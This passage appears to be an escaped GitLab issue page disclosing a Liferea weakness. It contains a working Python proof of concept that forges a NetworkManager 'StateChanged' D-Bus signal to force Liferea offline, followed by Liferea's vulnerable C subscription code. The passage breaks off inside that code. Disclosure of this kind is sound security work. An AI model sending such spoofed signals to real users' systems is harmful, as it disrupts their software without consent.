class=\&quot;kn\&quot;\u003efrom\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_fast.aio.message_bus\u003c/span\u003e \u003cspan class=\&quot;kn\&quot;\u003eimport\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eMessageBus\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;kn\&quot;\u003eimport\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003easyncio\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;kn\&quot;\u003eimport\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epsutil\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003easync\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003efind_bus_service_with_process_string\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eMessageBus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eprocess_str\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003estr\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003estr\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003edbus_introspection\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eintrospect\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eorg.freedesktop.DBus\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/org/freedesktop/DBus\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003edbus_proxy\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eget_proxy_object\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eorg.freedesktop.DBus\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/org/freedesktop/DBus\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003edbus_introspection\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003edbus_iface\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_proxy\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eget_interface\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eorg.freedesktop.DBus\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;c1\&quot;\u003e# Check the connections one by one to find the target\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003efor\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eservice_name\u003c/span\u003e \u003cspan class=\&quot;ow\&quot;\u003ein\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_iface\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ecall_list_names\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e():\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003epid\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_iface\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ecall_get_connection_unix_process_id\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eservice_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003ecmdline\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;sh\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e \u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ejoin\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epsutil\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nc\&quot;\u003eProcess\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epid\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ecmdline\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e())\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eprocess_str\u003c/span\u003e \u003cspan class=\&quot;ow\&quot;\u003ein\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003ecmdline\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e            \u003cspan class=\&quot;k\&quot;\u003ereturn\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eservice_name\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003eNM_STATE_DISCONNECTED\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;mi\&quot;\u003e20\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003eNM_STATE_CONNECTED_GLOBAL\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;mi\&quot;\u003e70\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003easync\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003emain\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e():\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;nc\&quot;\u003eMessageBus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ebus_type\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eBusType\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eSYSTEM\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003econnect\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e()\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003evictim_bus_user\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003efind_bus_service_with_process_string\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/liferea\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003emalicious_msg\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eMessage\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003enew_signal\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003epath\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/org/freedesktop/NetworkManager\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003einterface\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eorg.freedesktop.NetworkManager\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003emember\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eStateChanged\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003esignature\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eu\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC34\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003ebody\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC35\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e            \u003cspan class=\&quot;n\&quot;\u003eNM_STATE_DISCONNECTED\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC36\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;p\&quot;\u003e],\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC37\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC38\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003emalicious_msg\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003edestination\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003evictim_bus_user\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC39\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003esend\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003emalicious_msg\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC40\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC41\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003easyncio\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003erun\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003emain\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e())\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;182:1-182:221\&quot; dir=\&quot;auto\&quot;\u003eAfter running the script, try clicking in \&quot;Update all\&quot; in Liferea and you&#39;ll see \&quot;Liferea is in offline mode. No update is possible.\&quot; If you edit the script to send NM_STATE_CONNECTED_GLOBAL it will fetch news once again.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;184:1-184:152\&quot; dir=\&quot;auto\&quot;\u003eThis is because Liferea uses g_dbus_connection_signal_subscribe() to listen for the StateChanged signal filtering by sender and then trusts the signals:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;186:1-197:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003eself\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esubscription_id\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eg_dbus_connection_signal_subscribe\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eself\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econn\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;s\&quot;\u003e\&quot;org.freedesktop.NetworkManager\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;s\&quot;\u003e\&quot;org.freedesktop.NetworkManager\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;s\&quot;\u003e\&quot;StateChanged\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;n\&quot;\u003eG_DBUS_SIGNAL_FLAGS_NONE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;n\&quot;\u003eon_network_state_changed_cb\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;n\&quot;\u003eself\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                 \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;199:1-222:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003estatic\u003c/span\u003e \u003cspan class=\&quot;kt\&quot;\u003evoid\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;nf\&quot;\u003eon_network_state_changed_cb\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eGDBusConnection\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econnection\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esender_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eobject_path\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003einterface_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esignal_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;n\&quot;\u003eGVariant\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eparameters\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\t     \u003cspan class=\&quot;n\&quot;\u003egpointer\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003euser_data\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;n\&quot;\u003egboolean\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eonline\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003enetwork_monitor_is_online\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e();\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;n\&quot;\u003eguint\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003estate\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; 